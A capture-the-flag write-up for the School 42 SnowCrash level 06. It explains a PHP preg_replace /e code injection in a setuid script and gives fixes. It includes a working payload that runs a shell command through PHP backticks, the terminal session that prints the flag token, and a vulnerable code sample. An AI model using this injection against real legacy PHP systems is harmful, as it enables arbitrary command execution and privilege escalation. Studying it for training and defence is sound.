```
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

# SnowCrash — Level 06 Flag Capture

> **School 42 — SnowCrash project**
> This write-up explains how to capture the flag of level 06 by exploiting a PHP `preg_replace()` code injection vulnerability via the deprecated `/e` modifier.

---

## Table of Contents

- [Context](#context)
- [Files Available](#files-available)
- [Code Analysis](#code-analysis)
- [The Vulnerability](#the-vulnerability)
- [Exploit — Step by Step](#exploit--step-by-step)
- [Why Is This Dangerous?](#why-is-this-dangerous)
- [How to Protect Against It](#how-to-protect-against-it)

---

## Context

Upon logging in as `level06`, two files are available:

```bash
ls -la /home/user/level06/
# level06      (executable, owned by flag06, setuid bit set)
# level06.php  (PHP source code, readable by level06)
```

The executable runs `level06.php` with elevated privileges (`flag06`). The goal is to exploit the PHP script to execute `getflag` in the context of `flag06`.

---

## Files Available

### `level06.php` — Source Code

```php
#!/usr/bin/php
<?php

function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;

?>
```

---

## Code Analysis

### Function `y($m)` — The Email Formatter

This function was designed to format email addresses into a human-readable form:

```php
$m = preg_replace("/\./", " x ", $m);  // replaces literal dots  →  " x "
$m = preg_replace("/@/",  " y",  $m);  // replaces @ symbol      →  " y"
```

**Example:**
```
foo@bar.com  →  foo y bar x com
```
> [!IMPORTANT]
> `y()` is called **before** the `/e` evaluation. Any payload must survive these substitutions intact.

---

### Function `x($y, $z)` — The File Processor

```php
$a = file_get_contents($y);
```
Reads the **entire content** of the file passed as the first argument (`$argv[1]`).

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```
This is the **critical line**:
- Matches any string of the form `[x SOMETHING]`
- Extracts `SOMETHING` via the capture group `\2`
- Calls `y("SOMETHING")` as a replacement string
- The `/e` modifier **evaluates the replacement as PHP code**

```php
$a = preg_replace("/\[/", "(", $a);  // replaces [ with (
$a = preg_replace("/\]/", ")", $a);  // replaces ] with )
```
Simple character substitutions on whatever remains after the `/e` evaluation.

---

### Main Program

```php
$r = x($argv[1], $argv[2]);
print $r;
```

- `$argv[1]` → path to the file to read (**attacker-controlled**)
- `$argv[2]` → passed to `x()` as `$z` but **never used** inside the function

---

## The Vulnerability

### `preg_replace()` with `/e` modifier (CVE class: Code Injection)

In PHP versions **< 7.0**, the `/e` modifier in `preg_replace()` causes the replacement string to be **evaluated as PHP code** after substitution.

This means that if an attacker controls the content matched by the regex, they can inject **arbitrary PHP code** that will be executed with the privileges of the running process.

**Execution flow:**

```
File content   →   regex match   →   \2 extracted   →   y() called   →   /e evaluates result as PHP
[x ${`getflag`}]      ✅              ${`getflag`}       unchanged          getflag executed!
```

> The payload `` ${`getflag`} `` contains no `.` or `@`, so `y()` does **not** alter it.
> PHP backtick syntax `` `command` `` executes a shell command and returns its output.
> `${ }` forces PHP to evaluate the expression inside as a variable expression.

---

## Exploit — Step by Step

### Step 1 — Create the payload file

```bash
echo '[x ${`getflag`}]' > /tmp/exploit
```

This creates a file in `/tmp` containing the string `[x ${`getflag`}]`, which matches the vulnerable regex pattern in `x()`.

### Step 2 — Run the executable with your file

```bash
/home/user/level06/level06 /tmp/exploit
```

### Step 3 — Get the flag

The output of `getflag` is printed directly to the terminal — this is **the level 06 flag**.

---

## Why Is This Dangerous?

| Risk | Explanation |
|------|-------------|
| **Arbitrary code execution** | Any PHP code can be injected and executed |
| **Privilege escalation** | The script runs as `flag06` (setuid), so injected commands inherit those privileges |
| **No input sanitisation** | User-controlled file content flows directly into the vulnerable regex |
| **Silent evaluation** | The `/e` flag makes it non-obvious that code is being executed |
| **Wide attack surface** | Any file the script reads can contain a malicious payload |

---

## How to Protect Against It

### 1. Upgrade PHP (mandatory)
The `/e` modifier was **deprecated in PHP 5.5** and **removed in PHP 7.0**.
Simply running PHP 7+ makes this entire class of attack impossible.

### 2. Use `preg_replace_callback()` instead
Replace the vulnerable pattern with a callback function:

```php
// Vulnerable
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

// Safe
$a = preg_replace_callback("/(\[x (.*)\])/", function($matches) {
    return y($matches[2]);
}, $a);
```

The callback receives matched groups as a plain array — **no code evaluation happens**.

### 3. Never trust user-controlled input
Any file path or file content provided by the user should be treated as untrusted. Validate and sanitise inputs before processing.

### 4. Apply the principle of least privilege
Avoid setuid binaries when possible. If elevated privileges are needed, use a controlled, minimal wrapper rather than exposing a full script.

---

## Key Takeaways

- **`preg_replace` + `/e`** is a textbook PHP code injection vector
- The vulnerability exists because **regex replacement** and **code evaluation** were combined into a single operation
- Controlling the **input file** is enough to fully compromise the system
- Modern PHP (7+) eliminates this by design — always keep your runtime up to date

---

*Write-up produced as part of the SnowCrash project — École 42*
